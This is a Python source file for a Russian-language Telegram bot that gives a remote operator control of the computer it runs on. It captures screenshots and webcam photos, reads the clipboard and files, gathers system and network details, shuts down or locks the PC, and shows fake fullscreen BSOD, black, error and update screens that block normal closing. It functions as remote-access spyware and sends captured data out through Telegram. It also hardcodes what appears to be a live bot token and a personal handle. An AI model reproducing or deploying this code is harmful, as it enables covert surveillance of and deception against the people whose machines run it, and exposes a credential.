import os
import subprocess
import tempfile
import psutil
import pyautogui
import telebot
from telebot import types
from PIL import ImageGrab, ImageDraw
import time
import json
from datetime import datetime
import random
import requests
import webbrowser
import speech_recognition as sr
import pyttsx3
import wikipedia
import pyjokes
import cv2
import numpy as np
import keyboard as kb
import platform
import socket
import getpass
import pyperclip
import pywhatkit as kit
import qrcode
import speedtest
import tkinter as tk
import threading
import sys

# Настройки бота с вашим API ключом
BOT_TOKEN = '8453334672:AAE-BQX9Rl6GJ-kFs58j06VLVWPmMnp-oCI'
bot = telebot.TeleBot(BOT_TOKEN)

# Ваши данные
YOUR_ADMIN_ID = 5606253168
YOUR_USERNAME = '@Sanya_HudasLove'

# Файл для хранения разрешенных пользователей
ALLOWED_USERS_FILE = 'allowed_users.json'

# Глобальные переменные для управления окнами
active_windows = {}


def load_allowed_users():
    """Загружает список разрешенных пользователей"""
    try:
        if os.path.exists(ALLOWED_USERS_FILE):
            with open(ALLOWED_USERS_FILE, 'r') as f:
                return json.load(f)
        return []
    except:
        return []


def save_allowed_users(users):
    """Сохраняет список разрешенных пользователей"""
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump(users, f)


def is_user_allowed(user_id):
    """Проверяет, разрешен ли пользователь"""
    allowed_users = load_allowed_users()
    return user_id in allowed_users


# ==================== ФЕЙКОВЫЕ ЭКРАНЫ ====================

def close_all_windows():
    """Закрывает все активные фейковые окна"""
    for window_id, window_info in list(active_windows.items()):
        try:
            if window_info['window'] and window_info['window'].winfo_exists():
                window_info['window'].destroy()
            del active_windows[window_id]
        except:
            continue


def fake_blue_screen(chat_id):
    """Создает фейковый синий экран смерти"""
    try:
        close_all_windows()

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='#0078D7')
        root.attributes('-topmost', True)
        root.overrideredirect(True)

        # Убираем стандартные способы закрытия
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        window_id = f"bsod_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'bsod'}

        text = """
😈 ФЕЙКОВЫЙ СИНИЙ ЭКРАН СМЕРТИ

Ваш компьютер встретился с проблемой, и его необходимо перезагрузить.
Мы просто собираем некоторые данные об ошибке, а затем произведем перезагрузку.

(Завершение 0%) 

Если вы хотите узнать больше, вы можете поискать в интернете позже вот с этим кодом ошибки: FAKE_BSOD_666

Для получения дополнительной информации посетите: https://t.me/Sanya_HudasLove

Техническая информация:
*** STOP: 0x000000DEAD (0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000)

⚠️ Чтобы закрыть этот экран, нажмите ESC
"""
        label = tk.Label(root, text=text, font=('Consolas', 14), fg='white', bg='#0078D7', justify='left')
        label.pack(expand=True)

        # Кнопка закрытия
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "✅ Синий экран закрыт")

        root.bind('<Escape>', close_window)

        # Запускаем в отдельном потоке
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"Ошибка синего экрана: {e}")
        return False


def fake_black_screen(chat_id):
    """Создает фейковый черный экран"""
    try:
        close_all_windows()

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        root.overrideredirect(True)

        # Убираем стандартные способы закрытия
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        window_id = f"black_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'black'}

        # Мигающий курсор
        cursor = tk.Label(root, text="_", font=('Consolas', 24), fg='green', bg='black')
        cursor.pack(expand=True)

        def blink():
            if cursor.cget('text') == "_":
                cursor.config(text=" ")
            else:
                cursor.config(text="_")
            if window_id in active_windows:
                root.after(500, blink)

        blink()

        # Функция закрытия
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "✅ Черный экран закрыт")

        root.bind('<Escape>', close_window)

        # Запускаем в отдельном потоке
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"Ошибка черного экрана: {e}")
        return False


def fake_error_message(chat_id):
    """Создает фейковое окно ошибки"""
    try:
        close_all_windows()

        root = tk.Toplevel()
        root.title("❌ Ошибка системы")
        root.geometry("400x250")
        root.attributes('-topmost', True)
        root.resizable(False, False)

        window_id = f"error_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'error'}

        # Иконка ошибки
        error_icon = tk.Label(root, text="❌", font=('Arial', 24))
        error_icon.pack(pady=10)

        # Текст ошибки
        error_text = tk.Label(root,
                              text="Критическая ошибка системы!\n\nНе удалось выполнить операцию.\nКод ошибки: 0xFAKE_ERROR\n\nНажмите ESC для закрытия",
                              font=('Arial', 10))
        error_text.pack(pady=10)

        # Кнопка (неактивная)
        ok_btn = tk.Button(root, text="OK (нажми ESC)", command=lambda: None, width=15)
        ok_btn.pack(pady=10)

        # Функция закрытия
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "✅ Окно ошибки закрыто")

        root.bind('<Escape>', close_window)
        root.protocol("WM_DELETE_WINDOW", close_window)

        # Запускаем в отдельном потоке
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"Ошибка создания ошибки: {e}")
        return False


def fake_loading_screen(chat_id):
    """Фейковый экран загрузки"""
    try:
        close_all_windows()

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        root.overrideredirect(True)

        window_id = f"loading_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'loading'}

        # Логотип
        logo = tk.Label(root, text="⚡", font=('Arial', 48), fg='white', bg='black')
        logo.pack(pady=50)

        # Текст загрузки
        loading_text = tk.Label(root, text="Обновление системы...\n\nНажмите ESC для отмены",
                                font=('Arial', 16), fg='white', bg='black')
        loading_text.pack()

        # Прогресс бар
        progress_frame = tk.Frame(root, bg='black')
        progress_frame.pack(pady=20)

        progress_bar = tk.Canvas(progress_frame, width=300, height=20, bg='black', highlightthickness=0)
        progress_bar.pack()

        progress = 0
        bar = progress_bar.create_rectangle(0, 0, 0, 20, fill='blue', outline='')

        def update_progress():
            nonlocal progress
            if progress < 100 and window_id in active_windows:
                progress += random.randint(1, 3)
                if progress > 100:
                    progress = 100

                progress_bar.coords(bar, 0, 0, progress * 3, 20)
                percent_label.config(text=f"{progress}%")
                root.after(200, update_progress)

        # Процент
        percent_label = tk.Label(root, text="0%", font=('Arial', 14), fg='white', bg='black')
        percent_label.pack()

        update_progress()

        # Функция закрытия
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "✅ Экран загрузки закрыт")

        root.bind('<Escape>', close_window)

        # Запускаем в отдельном потоке
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"Ошибка экрана загрузки: {e}")
        return False


# ==================== УПРАВЛЕНИЕ ОКНАМИ ====================

@bot.message_handler(commands=['close'])
def close_windows_command(message):
    """Закрывает все активные фейковые окна"""
    if not is_user_allowed(message.from_user.id):
        return

    closed_count = 0
    for window_id in list(active_windows.keys()):
        try:
            window_info = active_windows[window_id]
            if window_info['window'] and window_info['window'].winfo_exists():
                window_info['window'].destroy()
            del active_windows[window_id]
            closed_count += 1
        except:
            continue

    if closed_count > 0:
        bot.send_message(message.chat.id, f"✅ Закрыто {closed_count} активных окон")
    else:
        bot.send_message(message.chat.id, "ℹ️ Нет активных окон для закрытия")


@bot.message_handler(commands=['status'])
def status_command(message):
    """Показывает статус активных окон"""
    if not is_user_allowed(message.from_user.id):
        return

    if active_windows:
        status_text = "📊 Активные окна:\n"
        for window_id, window_info in active_windows.items():
            status_text += f"• {window_info['type']}\n"
        status_text += "\nИспользуйте /close чтобы закрыть все"
    else:
        status_text = "ℹ️ Нет активных окон"

    bot.send_message(message.chat.id, status_text)


# ==================== БАЗОВЫЕ ФУНКЦИИ ====================

def take_screenshot():
    """Делает скриншот экрана"""
    try:
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
            screenshot = ImageGrab.grab()
            screenshot.save(tmp.name, 'PNG')
            return tmp.name
    except Exception as e:
        print(f"Ошибка при создании скриншота: {e}")
        return None


def take_webcam_photo():
    """Делает фото с вебкамеры"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            cap.release()
            if ret:
                with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
                    cv2.imwrite(tmp.name, frame)
                    return tmp.name
        return None
    except:
        return None


def send_screenshot(chat_id):
    """Отправляет скриншот в Telegram"""
    try:
        screenshot_path = take_screenshot()
        if screenshot_path:
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="📸 Скриншот экрана")
            os.unlink(screenshot_path)
            return True
        bot.send_message(chat_id, "❌ Не удалось сделать скриншот")
        return False
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {e}")
        return False


def send_webcam_photo(chat_id):
    """Отправляет фото с вебкамеры"""
    try:
        photo_path = take_webcam_photo()
        if photo_path:
            with open(photo_path, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="📷 Фото с вебкамеры")
            os.unlink(photo_path)
            return True
        bot.send_message(chat_id, "❌ Не удалось сделать фото с вебкамеры")
        return False
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка вебкамеры: {e}")
        return False


# Функции управления системой
def shutdown_pc():
    try:
        if os.name == 'nt':
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")
        return True
    except:
        return False


def restart_pc():
    try:
        if os.name == 'nt':
            os.system("shutdown /r /t 1")
        else:
            os.system("reboot")
        return True
    except:
        return False


def lock_pc():
    try:
        if os.name == 'nt':
            os.system("rundll32.exe user32.dll,LockWorkStation")
        else:
            os.system("gnome-screensaver-command -l")
        return True
    except:
        return False


# ==================== ИНФОРМАЦИОННЫЕ ФУНКЦИИ ====================

def get_system_info():
    try:
        info = []
        info.append(f"💻 OS: {platform.platform()}")
        info.append(f"🐍 Python: {platform.python_version()}")
        info.append(f"🚀 CPU: {psutil.cpu_percent()}%")
        info.append(f"🧠 RAM: {psutil.virtual_memory().percent}%")

        try:
            disk_usage = psutil.disk_usage('/')
            info.append(f"💾 Disk: {disk_usage.percent}%")
        except:
            info.append("💾 Disk: Не доступно")

        info.append(f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"👤 User: {getpass.getuser()}")

        return "\n".join(info)
    except Exception as e:
        return f"❌ Ошибка: {e}"


def get_weather(city="Москва"):
    try:
        url = f"http://wttr.in/{city}?format=%c+%t+%w+%h"
        response = requests.get(url)
        return f"🌤 {city}: {response.text.strip()}"
    except:
        return "❌ Не удалось получить погоду"


def get_network_info():
    """Информация о сети"""
    try:
        info = []
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        info.append(f"🌐 Хост: {hostname}")
        info.append(f"📡 IP: {ip}")
        return "\n".join(info)
    except:
        return "❌ Не удалось получить сетевую информацию"


# ==================== РАЗВЛЕКАТЕЛЬНЫЕ ФУНКЦИИ ====================

def tell_joke():
    try:
        return pyjokes.get_joke(language='ru')
    except:
        return "Почему программисты такие крутые? Потому что они всегда debug-ают проблемы! 😄"


def random_fact():
    facts = [
        "Знаешь ли ты, что первый компьютер весил более 30 тонн?",
        "Самый быстрый суперкомпьютер делает 1 квинтиллион операций в секунду!",
        "Первый компьютерный баг был настоящим мотыльком в 1947 году.",
    ]
    return random.choice(facts)


def magic_8ball():
    answers = [
        "Бесспорно! ✅", "Предрешено! ✅", "Никаких сомнений! ✅",
        "Определённо да! ✅", "Мне кажется — «да»! 🤔",
        "Пока не ясно, попробуй снова! 🔄", "Спроси позже! ⏰",
        "Лучше не рассказывать! 🤫", "Даже не думай! ❌"
    ]
    return random.choice(answers)


# ==================== УТИЛИТЫ ====================

def volume_up():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
        return True
    except:
        return False


def volume_down():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
        return True
    except:
        return False


def mute_volume():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
        return True
    except:
        return False


def play_pause():
    try:
        kb.press_and_release('play/pause media')
        return True
    except:
        return False


def next_track():
    try:
        kb.press_and_release('next track')
        return True
    except:
        return False


def prev_track():
    try:
        kb.press_and_release('previous track')
        return True
    except:
        return False


def list_files(directory="."):
    try:
        files = os.listdir(directory)
        return "\n".join([f"📁 {f}" if os.path.isdir(os.path.join(directory, f)) else f"📄 {f}"
                          for f in files[:10]])
    except Exception as e:
        return f"❌ Ошибка: {e}"


def get_clipboard():
    """Получить содержимое буфера обмена"""
    try:
        return pyperclip.paste()
    except:
        return "Не удалось получить буфер обмена"


# ==================== КЛАВИАТУРА ====================

def create_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)

    keyboard.row('📸 Скриншот', '📷 Вебкамера', '📋 Инфо')
    keyboard.row('🔌 Выключить', '🔄 Перезагрузка', '🔒 Заблокировать')
    keyboard.row('🎵 Громкость +', '🎵 Громкость -', '🔇 Mute')
    keyboard.row('📁 Файлы', '🌤 Погода', '🌐 Сеть')
    keyboard.row('🎮 Игры', '🔮 8ball', '🎭 Шутка')
    keyboard.row('🤔 Факт', '📋 Буфер', '❓ Помощь')
    keyboard.row('💙 Синий экран', '⚫ Чёрный экран', '❌ Ошибка')
    keyboard.row('📊 Загрузка', '🚫 Закрыть окна', '📊 Статус окон')

    return keyboard


# ==================== ОБРАБОТЧИКИ КОМАНД ====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id

    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "⛔ Доступ запрещен. Обратитесь к администратору.")
        return

    welcome_text = f"""
🤖 Добро пожаловать в МЕГА-БОТ, {message.from_user.first_name}!

👑 Администратор: {YOUR_USERNAME}

✨ Новые функции - Фейковые экраны:
💙 Синий экран - Фейковый BSOD
⚫ Чёрный экран - Пустой экран  
❌ Ошибка - Окно ошибки Windows
📊 Загрузка - Экран загрузки

🎛 Используй кнопки ниже!
"""

    bot.send_message(message.chat.id, welcome_text, reply_markup=create_keyboard())


# Основные команды
@bot.message_handler(commands=['screenshot'])
def screenshot_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    bot.send_message(message.chat.id, "📸 Делаю скриншот...")
    send_screenshot(message.chat.id)


@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    bot.send_message(message.chat.id, "📷 Включаю вебкамеру...")
    send_webcam_photo(message.chat.id)


@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    if shutdown_pc():
        bot.send_message(message.chat.id, "🔌 Компьютер выключается...")
    else:
        bot.send_message(message.chat.id, "❌ Не удалось выключить компьютер")


@bot.message_handler(commands=['restart'])
def restart_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    if restart_pc():
        bot.send_message(message.chat.id, "🔄 Компьютер перезагружается...")
    else:
        bot.send_message(message.chat.id, "❌ Не удалось перезагрузить компьютер")


@bot.message_handler(commands=['lock'])
def lock_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    if lock_pc():
        bot.send_message(message.chat.id, "🔒 Компьютер заблокирован!")
    else:
        bot.send_message(message.chat.id, "❌ Не удалось заблокировать")


@bot.message_handler(commands=['info'])
def info_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    info = get_system_info()
    bot.send_message(message.chat.id, f"📊 Информация о системе:\n\n{info}")


@bot.message_handler(commands=['weather'])
def weather_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    city = message.text[9:] if len(message.text) > 9 else "Москва"
    weather = get_weather(city)
    bot.send_message(message.chat.id, weather)


@bot.message_handler(commands=['network'])
def network_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    info = get_network_info()
    bot.send_message(message.chat.id, f"🌐 Сетевая информация:\n\n{info}")


@bot.message_handler(commands=['joke'])
def joke_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    joke = tell_joke()
    bot.send_message(message.chat.id, f"🎭 {joke}")


@bot.message_handler(commands=['fact'])
def fact_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    fact = random_fact()
    bot.send_message(message.chat.id, f"🤔 {fact}")


@bot.message_handler(commands=['8ball'])
def eight_ball_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    answer = magic_8ball()
    bot.send_message(message.chat.id, f"🔮 Магический шар говорит: {answer}")


@bot.message_handler(commands=['files'])
def files_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    files = list_files()
    bot.send_message(message.chat.id, f"📁 Файлы в текущей директории:\n\n{files}")


@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    content = get_clipboard()
    bot.send_message(message.chat.id, f"📋 Буфер обмена:\n{content}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
🤖 ПОМОЩЬ ПО БОТУ

📋 ФЕЙКОВЫЕ ЭКРАНЫ:
💙 Синий экран - Фейковый BSOD
⚫ Чёрный экран - Пустой экран с курсором  
❌ Ошибка - Окно ошибки Windows
📊 Загрузка - Экран загрузки с прогрессбаром

🚫 Управление окнами:
/close - Закрыть все активные окна
/status - Показать статус окон

💡 Как использовать:
1. Нажми кнопку с нужным экраном
2. Экран откроется поверх всех окон
3. Нажми ESC чтобы закрыть экран
4. Используй /close чтобы закрыть все

⚠️ Все экраны закрываются по ESC!
"""
    bot.send_message(message.chat.id, help_text)


# Обработчик текстовых сообщений (кнопки)
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_user_allowed(message.from_user.id):
        return

    text = message.text
    chat_id = message.chat.id

    # Фейковые экраны
    if text == '💙 Синий экран':
        bot.send_message(chat_id, "💙 Запускаю фейковый синий экран...")
        if fake_blue_screen(chat_id):
            bot.send_message(chat_id, "✅ Синий экран запущен! Нажми ESC чтобы закрыть")
        else:
            bot.send_message(chat_id, "❌ Не удалось запустить синий экран")

    elif text == '⚫ Чёрный экран':
        bot.send_message(chat_id, "⚫ Запускаю фейковый черный экран...")
        if fake_black_screen(chat_id):
            bot.send_message(chat_id, "✅ Черный экран запущен! Нажми ESC чтобы закрыть")
        else:
            bot.send_message(chat_id, "❌ Не удалось запустить черный экран")

    elif text == '❌ Ошибка':
        bot.send_message(chat_id, "❌ Запускаю фейковую ошибку...")
        if fake_error_message(chat_id):
            bot.send_message(chat_id, "✅ Ошибка запущена! Нажми ESC чтобы закрыть")
        else:
            bot.send_message(chat_id, "❌ Не удалось запустить ошибку")

    elif text == '📊 Загрузка':
        bot.send_message(chat_id, "📊 Запускаю фейковую загрузку...")
        if fake_loading_screen(chat_id):
            bot.send_message(chat_id, "✅ Загрузка запущена! Нажми ESC чтобы закрыть")
        else:
            bot.send_message(chat_id, "❌ Не удалось запустить загрузку")

    elif text == '🚫 Закрыть окна':
        close_windows_command(message)

    elif text == '📊 Статус окон':
        status_command(message)

    # Остальные кнопки...
    elif text == '📸 Скриншот':
        bot.send_message(chat_id, "📸 Делаю скриншот...")
        send_screenshot(chat_id)

    elif text == '📷 Вебкамера':
        bot.send_message(chat_id, "📷 Включаю вебкамеру...")
        send_webcam_photo(chat_id)

    elif text == '📋 Инфо':
        info = get_system_info()
        bot.send_message(chat_id, f"📊 Информация о системе:\n\n{info}")

    elif text == '🔌 Выключить':
        if shutdown_pc():
            bot.send_message(chat_id, "🔌 Компьютер выключается...")
        else:
            bot.send_message(chat_id, "❌ Не удалось выключить компьютер")

    elif text == '🔄 Перезагрузка':
        if restart_pc():
            bot.send_message(chat_id, "🔄 Компьютер перезагружается...")
        else:
            bot.send_message(chat_id, "❌ Не удалось перезагрузить компьютер")

    elif text == '🔒 Заблокировать':
        if lock_pc():
            bot.send_message(chat_id, "🔒 Компьютер заблокирован!")
        else:
            bot.send_message(chat_id, "❌ Не удалось заблокировать")

    # Медиа функции
    elif text == '🎵 Громкость +':
        if volume_up():
            bot.send_message(chat_id, "🔊 Громкость увеличена")
        else:
            bot.send_message(chat_id, "❌ Не удалось изменить громкость")

    elif text == '🎵 Громкость -':
        if volume_down():
            bot.send_message(chat_id, "🔉 Громкость уменьшена")
        else:
            bot.send_message(chat_id, "❌ Не удалось изменить громкость")

    elif text == '🔇 Mute':
        if mute_volume():
            bot.send_message(chat_id, "🔇 Звук выключен")
        else:
            bot.send_message(chat_id, "❌ Не удалось выключить звук")

    # Информационные функции
    elif text == '📁 Файлы':
        files = list_files()
        bot.send_message(chat_id, f"📁 Файлы в текущей директории:\n\n{files}")

    elif text == '🌤 Погода':
        weather = get_weather()
        bot.send_message(chat_id, weather)

    elif text == '🌐 Сеть':
        info = get_network_info()
        bot.send_message(chat_id, f"🌐 Сетевая информация:\n\n{info}")

    # Развлечения
    elif text == '🎮 Игры':
        bot.send_message(chat_id, "🎮 Используй команды: /joke /fact /8ball")

    elif text == '🔮 8ball':
        answer = magic_8ball()
        bot.send_message(chat_id, f"🔮 Магический шар говорит: {answer}")

    elif text == '🎭 Шутка':
        joke = tell_joke()
        bot.send_message(chat_id, f"🎭 {joke}")

    elif text == '🤔 Факт':
        fact = random_fact()
        bot.send_message(chat_id, f"🤔 {fact}")

    # Утилиты
    elif text == '📋 Буфер':
        content = get_clipboard()
        bot.send_message(chat_id, f"📋 Буфер обмена:\n{content}")

    elif text == '❓ Помощь':
        help_command(message)

    else:
        bot.send_message(chat_id, "❌ Неизвестная команда. Используй кнопки или /help")


if __name__ == "__main__":
    print("🤖 Бот запускается...")
    print(f"👑 Администратор: {YOUR_USERNAME}")

    if not os.path.exists(ALLOWED_USERS_FILE):
        save_allowed_users([YOUR_ADMIN_ID])
        print("✅ Администратор добавлен в разрешенные")

    print("💙 Фейковые экраны активированы")
    print("🟢 БОТ ЗАПУЩЕН И ГОТОВ К РАБОТЕ! 🚀")

    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Ошибка бота: {e}")
        print("🔄 Перезапускаю бота...")
        time.sleep(5)
        os.execv(sys.executable, ['python'] + sys.argv)